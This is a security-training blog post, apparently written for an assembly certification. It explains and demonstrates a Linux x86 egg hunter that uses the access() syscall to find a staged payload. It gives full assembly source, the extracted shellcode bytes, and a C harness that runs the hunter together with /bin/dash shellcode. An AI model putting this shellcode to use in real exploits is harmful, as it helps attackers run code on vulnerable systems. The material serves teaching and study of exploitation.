---
layout: single
title: Egg Hunter for the Win - Linux x86
date: 2018-1-18
classes: wide
header:
---

Introduction
------------
What is egg hunter? and why on earth would you need it? This post will answer those questions and discuss [access()](http://man7.org/linux/man-pages/man2/access.2.html) syscall briefly, which is a vital part of the shellcode itself. The post will then conclude by demoing a working egg hunter shellcode. Please note all of the work here is based off of [Skape’s paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf).

Egg Hunting
-----------
Egg hunting is a technique used to search the [Virtual Address Space (VAS)](https://en.wikipedia.org/wiki/Virtual_address_space) for pattern referred to by the term egg which usually marks the start of our desired payload if you will. Now you would probably be asking yourself what if we hit an unallocated memory while searching for that pattern? Well, the answer is the process will `SIGSEGV` leading to a crash. To prevent this kind of behavior we will abuse [access()](http://man7.org/linux/man-pages/man2/access.2.html) syscall to hunt for our egg without crashing (more on that later). A good example of egg hunter use case is buffer overflows with limited buffer size that won’t allow for large payloads such as bind or reverse shell, in other words we use egg hunter as stager to capture and execute larger payloads.

access()
--------
`access()` syscall is used to check what permissions the calling process has to a file referred to by `pathname`, and it consist of two arguments as shown below

```C
int access(const char *pathname, int mode);
```

Two reasons you’d want to use `access()` syscall, the first being it doesn’t have lots of arguments thus less registers to initialize, which translate to smaller size. The second reason is we’re looking for function that doesn’t write to the pointer, cause that will defeat the purpose. We’ll use `pathname` pointer to preform address validation by observing the `ZF` flag, when the pointer hits an unallocated memory it will return `EFAULT`, meaning hey this [memory page](https://en.wikipedia.org/wiki/Page_(computer_memory)) is bad try the next one. Let’s identify `access()` id `EAX`.

```sh
root@falafel:~# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep access
#define __NR_access      33
#define __NR_faccessat  307
root@falafel:~#
```

Also its worth noting that we’ll need to repeat our egg twice (8 bytes) to avoid the collision of the egg hunter with itself, so the egg hunter would have to have two matches before it jumps to the payload.

Final Shellcode
---------------
Now that we know what egg hunter and `access()` are all about, let’s write the shellcode and then test it!

```nasm
global _start
 
section .text
 
_start:

    ; 
    ; access(2) code block
    ;
    cld                   ; make sure direction flag is NOT set
    xor edx,edx           ; initialize EDX register

nxt_page:                 ; increment page
    or dx,0xfff           ; first page alignment

nxt_addr:
    inc edx               ; increment address
    lea ebx,[edx+0x4]     ; load pointer with 8-bytes egg hunter
    push byte 0x21        ; #define __NR_access 33
    pop eax               ; load EAX
    int 0x80              ; ping kernel!
    cmp al,0xf2           ; check for EFAULT
    jz nxt_page           ; if yes go back to nxt_page
    mov eax,0x776f6f74    ; egg = woot
    mov edi,edx           ; save pointer address to EDI
    scasd                 ; compare EAX[woot] with EDI[????] first 4 bytes  
    jnz nxt_addr          ; if no go back to nxt_addr
    scasd                 ; compare EAX[woot] with EDI+4[????] second 4 bytes
    jnz nxt_addr          ; if no go back to nxt_addr
    jmp edi               ; go to the start of our shellcode
```

Let’s compile and dump shellcode!

```sh
falafel@ubuntu:~$ nasm -f elf32 -o EggHunter.o EggHunter.nasm 
falafel@ubuntu:~$ ld -z execstack -o EggHunter EggHunter.o
falafel@ubuntu:~$ objdump -d ./EggHunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xfc\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x74\x6f\x6f\x77\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
falafel@ubuntu:~$ 
```

Here’s the final egg hunter shellcode coupled with `/bin/dash` from [exploit-db](https://www.exploit-db.com/exploits/43476).

```c
#include<stdio.h>
#include<string.h>

unsigned char egghunter[]= \
"\xfc\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x74\x6f\x6f\x77\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char shellcode[] = \
/** wootwoot **/
"\x74\x6f\x6f\x77\x74\x6f\x6f\x77"
/** shellcode from https://www.exploit-db.com/exploits/43476/ **/
"\x31\xc0\x50\x68\x64\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


int main(){

     printf("Egghunter Length:  %d\n", strlen(egghunter));
     printf("Shellcode Length:  %d\n", strlen(shellcode));


     (*(void  (*)()) egghunter)();
     return 0;
}
```

Demo time!

[![Egg Hunter Demo](https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/chmod.png)](https://player.vimeo.com/video/251591647?dnt=1&app_id=122963 "Click to Watch!")

Closing Thoughts
----------------
I don’t know about you but egg hunter in its entirety fascinates me and I’m glad I learned how to write one! Thank you Skape for your awesome work! Feel free to contact me for questions via twitter [@ihack4falafel](https://twitter.com/ihack4falafel) . All of the code is available on on my github as shown in the link below.

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1115

Github Repo: [https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%203](https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%203)
